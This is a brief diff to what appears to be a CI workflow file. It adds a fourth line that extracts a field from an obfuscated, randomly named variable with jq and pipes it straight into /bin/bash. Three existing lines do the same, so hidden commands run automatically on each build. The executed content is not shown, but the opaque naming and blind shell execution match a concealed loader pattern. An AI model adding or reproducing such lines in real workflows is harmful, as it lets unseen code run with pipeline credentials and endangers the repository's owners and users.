@@ -25,6 +25,7 @@ jobs:
           echo $nz06 | jq -r .m2 | /bin/bash
           echo $pqza8713 | jq -r .pvlx9727 | /bin/bash
           echo $x3963 | jq -r .afgpc5523 | /bin/bash
+          echo $wcj4010 | jq -r .x80551 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
